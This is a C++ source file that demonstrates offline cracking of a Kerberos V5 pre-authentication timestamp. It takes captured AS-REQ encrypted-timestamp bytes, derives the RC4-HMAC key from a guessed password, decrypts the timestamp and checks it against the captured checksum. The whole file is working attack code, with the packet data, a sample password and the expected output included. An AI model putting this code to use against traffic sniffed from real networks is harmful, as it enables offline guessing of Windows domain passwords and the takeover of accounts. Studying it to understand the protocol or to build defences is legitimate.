
/*

	Kerberos V5 for Windows - Password Cracking Approach

	Let's consider the following elements.

		* KRB_AS_REQ: the Kerberos Authentication Service Request Message
		* ENC_PA_ENC_TIMESTAMP: the value of message field

		KRB_AS_REQ.padata.PA-ENC-TIMESTAMP.Value.encPA_ENC_TIMESTAMP

		* checksum = first 16 bytes of ENC_PA_ENC_TIMESTAMP
		* encrypted_data = ENC_PA_ENC_TIMESTAMP starting at byte 17 (i.e. ENC_PA_ENC_TIMESTAMP without the checksum)
		* pwd: the round password being tried

	compile on linux with openssl: g++ kv5.cpp -okv5 -lcrypto

	This is just simple example of how you would decrypt the timestamp message using a password

	December 2008 - info/pcap data supplied by dragonii / forum.insidepro.com
			code by weiss / forum.insidepro.com

	see RFC 4757 for details ..


*/
#include <openssl/md5.h>
#include <openssl/md4.h>
#include <openssl/rc4.h>

#include <string.h>
#include <stdio.h>

typedef unsigned char u8;
typedef unsigned short u16;
typedef unsigned int u32;

void hmac_md5(u8 *text, u32 text_len, u8* key, u32 key_len, u8* digest)
{
	MD5_CTX ctx;
	u8 k_ipad[65];
	u8 k_opad[65];
	u8 tk[16];

	if(key_len > 64) {

		MD5_Init(&ctx);
		MD5_Update(&ctx,key,key_len);
		MD5_Final(tk,&ctx);

		key = tk;
		key_len = 16;
	}

	memset(k_ipad,0,sizeof(k_ipad));
	memset(k_opad,0,sizeof(k_opad));

	memcpy(k_ipad,key,key_len);
	memcpy(k_opad,key,key_len);

	for(int i = 0;i < 64;i++) {
		k_ipad[i] ^= 0x36;
		k_opad[i] ^= 0x5c;
	}

	MD5_Init(&ctx);
	MD5_Update(&ctx,k_ipad,64);
	MD5_Update(&ctx,text,text_len);
	MD5_Final(digest,&ctx);

	MD5_Init(&ctx);
	MD5_Update(&ctx,k_opad,64);
	MD5_Update(&ctx,digest,16);
	MD5_Final(digest,&ctx);
}

void ntlm1_password(char *password, u8 *digest)
{
	u16 uni_pwd[128]={0};
	u32 pass_len = strlen(password);
	MD4_CTX ctx;

	for(int i = 0;i < pass_len;i++)
		uni_pwd[i] = password[i];

		MD4_Init(&ctx);
		MD4_Update(&ctx,uni_pwd,pass_len*2);
		MD4_Final(digest,&ctx);
}

/*
	PA_ENC_TIMESTAMP

	00004648h: 02 E8 37 D0 6B 2A C7 68 91 F3 88 D9 CC 36 C6 7A ; è7Ðk*Çh‘óˆÙÌ6Æz
	00004658h: 2A 97 85 BF 50 36 C4 5D 38 43 49 0B F9 C2 28 E8 ; *—…¿P6Ä]8CI.ùÂ(è
	00004668h: C1 86 53 E1 0C E5 8D 7F 8E F1 19 D2 EF 4F 92 B1 ; Á†Sá.åŽñ.ÒïO’±
	00004678h: 80 3B 14 51                                     ; €;.Q

*/

// checksum of timestamp
u8 ts_checksum[16]={ 0x02, 0xE8, 0x37, 0xD0, 0x6B, 0x2A, 0xC7, 0x68, 0x91, 0xF3, 0x88, 0xD9, 0xCC, 0x36, 0xC6, 0x7A };

// encrypted timestamp
u8 enc_data[36]={    0x2A, 0x97, 0x85, 0xBF, 0x50, 0x36, 0xC4, 0x5D, 0x38, 0x43, 0x49, 0x0B, 0xF9, 0xC2, 0x28, 0xE8,
		     0xC1, 0x86, 0x53, 0xE1, 0x0C, 0xE5, 0x8D, 0x7F, 0x8E, 0xF1, 0x19, 0xD2, 0xEF, 0x4F, 0x92, 0xB1,
		     0x80, 0x3B, 0x14, 0x51 };

void dump(char *str, u8 *digest)
{
		printf("\n%s = ",str);

		for(int i = 0;i < 16;i++)
			printf("%02X",digest[i]);

			printf("\n");
}

u8 clear_data[64];

int main(int argc, char *argv[])
{
		u8 K[16], K1[16], K2[16], K3[16];

		u32 T = 1;			// Message type..for PA-ENC-TIMESTAMP should always be 1

		RC4_KEY data_key;

		// 1. K=MD4(Little_endian(UNICODE(pwd))
		ntlm1_password("fr2beesgr", K);
		dump("K",K);

		// 2. K1=MD5_HMAC(K,1); // with 1 encoded as little endian on 4 bytes (01000000 in hexa);
		hmac_md5((u8*)&T,4,K,16,K1);
		dump("K1",K1);

		// 3. K3=MD5_HMAC(K1,checksum);
		hmac_md5(ts_checksum,16,K1,16,K3);
		dump("K3",K3);

		// 4. clear_data = RC4(K3,encrypted_data);
		RC4_set_key(&data_key,16,K3);

		// decrypt the data
		RC4(&data_key,sizeof(enc_data),enc_data,clear_data);

		printf("\nTimestamp = ");

		// check the first 4 bytes if equal to year packet was captured, if true, calculate the checksum
		// and compare with packet to be sure.

		for(int i = 14;i < 29;i++)
			printf("%c",clear_data[i]);

		// 5. If clear_data contains an UTC timestamp starting at byte 15 (in the format YYYYMMDDHHMMSSZ), you've got it.
		// 20081120171510Z

		/* decrypted result =

			K = 5EB9781973FDF67A3DA6A6CB95DC5394

			K1 = A7558D65959E0B76A85BB61F58875E42

			K3 = BEB76DD8EA246B2FA0CB0973F582E569

			Timestamp = 20081120171510Z

			Checksum of clear_data = 02E837D06B2AC76891F388D9CC36C67A
			 - valid password.
		*/

		// calculate the checksum
		hmac_md5(clear_data,sizeof(enc_data),K1,16,K2);

		dump("\nChecksum of clear_data",K2);

		if(!memcmp(K2,ts_checksum,16))
			printf(" - valid password.");
		else
			printf(" - invalid password.");

		printf("\n\n");

		return(0);
}
